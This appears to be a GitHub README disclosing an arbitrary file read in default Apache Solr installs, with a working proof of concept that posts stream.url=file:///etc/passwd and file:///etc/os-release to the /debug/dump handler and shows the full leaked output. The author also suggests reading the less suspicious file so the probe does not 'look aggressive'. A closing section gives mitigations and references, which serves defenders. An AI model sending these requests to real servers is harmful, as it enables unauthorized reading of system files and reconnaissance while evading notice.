<b>Apache Solr Arbitrary File Read</b>
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
![Hit Counter](https://shields-io-visitor-counter.herokuapp.com/badge?page=murataydemir.Apache-Solr-Arbitrary-File-Read&style=plastic&color=critical)
![Platform Badge](https://img.shields.io/badge/Platform-Apache%20Solr-critical?logo=apachesolr&style=plastic)

Apache Solr (stands for Searching On Lucene with Replication) is a free, open-source search engine based on the Apache Lucene library. Written in Java. Apache Solr has RESTful XML/HTTP and JSON APIs and client libraries for many programming languages such as Java, Phyton, Ruby, C#, PHP, and many more being used to build search-based and big data analytics applications for websites, databases, files, etc.

Here is some part of the description on the official page of Apache Solr: `A default/example installation of Solr allows any client with access to it to add, update, and delete documents (and of course search/read too), including access to the Solr configuration and schema files and the administrative user interface.`

This means; by default, an attacker can construct a malicious HTTP Request to read any file (within the permissions) on the Apache Solr server.

To verify vulnerability, you can use the following request

```
POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1
Host: vulnerablehost:8983
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

stream.url=file:///etc/passwd
```

```xml
HTTP/1.1 200 OK
Content-Type: application/xml; charset=UTF-8
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<response>
    <lst name="responseHeader">
        <int name="status">0</int>
        <int name="QTime">0</int>
        <str name="handler">org.apache.solr.handler.DumpRequestHandler</str>
        <lst name="params">
            <str name="param">ContentStreams</str>
            <str name="stream.url">file:///etc/passwd</str>
        </lst>
    </lst>
    <lst name="params">
        <str name="stream.url">file:///etc/passwd</str>
        <str name="echoHandler">true</str>
        <str name="param">ContentStreams</str>
        <str name="echoParams">explicit</str>
    </lst>
    <arr name="streams">
        <lst>
            <null name="name" />
            <str name="sourceInfo">url</str>
            <null name="size" />
            <null name="contentType" />
            <str name="stream">root:x:0:0:root:/root:/bin/bash
                bin:x:1:1:bin:/bin:/sbin/nologin
                daemon:x:2:2:daemon:/sbin:/sbin/nologin
                adm:x:3:4:adm:/var/adm:/sbin/nologin
                lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
                sync:x:5:0:sync:/sbin:/bin/sync
                shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
                halt:x:7:0:halt:/sbin:/sbin/halt
                mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
                operator:x:11:0:operator:/root:/sbin/nologin
                games:x:12:100:games:/usr/games:/sbin/nologin
                ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
                nobody:x:99:99:Nobody:/:/sbin/nologin
                systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
                dbus:x:81:81:System message bus:/:/sbin/nologin
                polkitd:x:999:998:User for polkitd:/:/sbin/nologin
                sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
                postfix:x:89:89::/var/spool/postfix:/sbin/nologin
                chrony:x:998:996::/var/lib/chrony:/sbin/nologin
                nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
                tcpdump:x:72:72::/:/sbin/nologin
                cloudera-scm:x:997:995:Cloudera Manager:/var/lib/cloudera-scm-server:/sbin/nologin
                rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
                apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
                mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
                flume:x:996:993:Flume:/var/lib/flume-ng:/sbin/nologin
                hdfs:x:995:992:Hadoop HDFS:/var/lib/hadoop-hdfs:/sbin/nologin
                solr:x:994:991:Solr:/var/lib/solr:/bin/bash
                #solr:x:994:991:Solr:/var/lib/solr:/sbin/nologin
                sentry:x:993:990:Sentry:/var/lib/sentry:/sbin/nologin
                hue:x:992:989:Hue:/usr/lib/hue:/sbin/nologin
                zookeeper:x:991:988:ZooKeeper:/var/lib/zookeeper:/sbin/nologin
                mapred:x:990:987:Hadoop MapReduce:/var/lib/hadoop-mapreduce:/sbin/nologin
                httpfs:x:989:986:Hadoop HTTPFS:/var/lib/hadoop-httpfs:/sbin/nologin
                sqoop:x:988:985:Sqoop:/var/lib/sqoop:/sbin/nologin
                hive:x:987:984:Hive:/var/lib/hive:/sbin/nologin
                kafka:x:986:983:Kafka:/var/lib/kafka:/sbin/nologin
                kms:x:985:982:Hadoop KMS:/var/lib/hadoop-kms:/sbin/nologin
                yarn:x:984:981:Hadoop Yarn:/var/lib/hadoop-yarn:/sbin/nologin
                oozie:x:983:980:Oozie User:/var/lib/oozie:/sbin/nologin
                kudu:x:982:979:Kudu:/var/lib/kudu:/sbin/nologin
                hbase:x:981:978:HBase:/var/lib/hbase:/sbin/nologin
                impala:x:980:977:Impala:/var/lib/impala:/sbin/nologin
                spark:x:979:976:Spark:/var/lib/spark:/sbin/nologin
                postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash
                ckan:x:1000:1000:CKAN User:/usr/lib/ckan:/sbin/nologin
                redis:x:978:974:Redis Database Server:/var/lib/redis:/sbin/nologin
                tomcat:x:53:53:Apache Tomcat:/usr/share/tomcat:/sbin/nologin
            </str>
        </lst>
    </arr>
    <lst name="context">
        <str name="webapp">/solr</str>
        <str name="path">/debug/dump</str>
        <str name="httpMethod">POST</str>
    </lst>
</response>
```
<img width="1919" alt="PoC-1" src="https://user-images.githubusercontent.com/16391655/127770303-89973765-3679-44fe-b2f9-a895ce971564.png">

Or basically, you can also choose this file to read (so as not to look aggressive)

```
POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1
Host: vulnerablehost:8983
Content-Length: 33
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

stream.url=file:///etc/os-release
```

```xml
HTTP/1.1 200 OK
Content-Type: application/xml; charset=UTF-8
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<response>
    <lst name="responseHeader">
        <int name="status">0</int>
        <int name="QTime">0</int>
        <str name="handler">org.apache.solr.handler.DumpRequestHandler</str>
        <lst name="params">
            <str name="param">ContentStreams</str>
            <str name="stream.url">file:///etc/os-release</str>
        </lst>
    </lst>
    <lst name="params">
        <str name="stream.url">file:///etc/os-release</str>
        <str name="echoHandler">true</str>
        <str name="param">ContentStreams</str>
        <str name="echoParams">explicit</str>
    </lst>
    <arr name="streams">
        <lst>
            <null name="name" />
            <str name="sourceInfo">url</str>
            <null name="size" />
            <null name="contentType" />
            <str name="stream">NAME="CentOS Linux"
                VERSION="7 (Core)"
                ID="centos"
                ID_LIKE="rhel fedora"
                VERSION_ID="7"
                PRETTY_NAME="CentOS Linux 7 (Core)"
                ANSI_COLOR="0;31"
                CPE_NAME="cpe:/o:centos:centos:7"
                HOME_URL="https://www.centos.org/"
                BUG_REPORT_URL="https://bugs.centos.org/"
                CENTOS_MANTISBT_PROJECT="CentOS-7"
                CENTOS_MANTISBT_PROJECT_VERSION="7"
                REDHAT_SUPPORT_PRODUCT="centos"
                REDHAT_SUPPORT_PRODUCT_VERSION="7"
            </str>
        </lst>
    </arr>
    <lst name="context">
        <str name="webapp">/solr</str>
        <str name="path">/debug/dump</str>
        <str name="httpMethod">POST</str>
    </lst>
</response>
```
<img width="1919" alt="PoC-2" src="https://user-images.githubusercontent.com/16391655/127770501-04860e87-70ba-455d-963b-0302e0e6c440.png">

Officially, there is no CVE assigned this vulnerability by Apache or other authorities. Thus, there is no announced solution such as a workaround or patch. However, in order to mitigate this vulnerability (arbitrary file read) you can implement [Basic Authentication Plugin](https://solr.apache.org/guide/8_1/basic-authentication-plugin.html) Apache Solr which is already running, or implement [IP address restriction](https://stackoverflow.com/questions/8924102/restricting-ip-addresses-for-jetty-and-solr) for Jetty. Even though you add SSL or Authentication plugins, it is still strongly recommended that the application server containing Solr be firewalled such that the only clients with access to Solr are your own.

For more information about this vulnerability, the following pages may help you.

[https://cwiki.apache.org/confluence/display/solr/SolrSecurity](https://cwiki.apache.org/confluence/display/solr/SolrSecurity)<br>
[https://issues.apache.org/jira/projects/SOLR/issues/SOLR-14438?filter=allopenissues](https://issues.apache.org/jira/projects/SOLR/issues/SOLR-14438?filter=allopenissues)<br>
[https://chowdera.com/2021/04/20210402171147072i.html](https://chowdera.com/2021/04/20210402171147072i.html)<br>
[https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ](https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ)
